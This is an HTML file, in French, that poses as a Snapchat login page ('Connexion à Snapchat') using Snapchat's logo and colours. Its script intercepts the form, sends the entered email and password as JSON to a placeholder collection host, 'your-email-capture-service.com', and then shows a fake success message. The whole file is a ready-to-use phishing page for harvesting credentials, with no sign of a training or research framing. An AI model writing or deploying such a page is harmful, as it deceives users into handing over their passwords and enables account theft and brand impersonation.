<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Snapchat</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { width: 100%; padding: 10px; background-color: #fffc00; border: none; color: black; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.snapchat.com/static/images/og-image-05f35f.png" alt="Snapchat Logo" style="width: 100px; height: 100px; display: block; margin: 0 auto;">
        <h2>Connexion</h2>
        <form id="loginForm">
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://your-email-capture-service.com", true);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.send(JSON.stringify({email: email, password: password}));
            alert('Connexion réussie!');
        });
    </script>
</body>
</html>
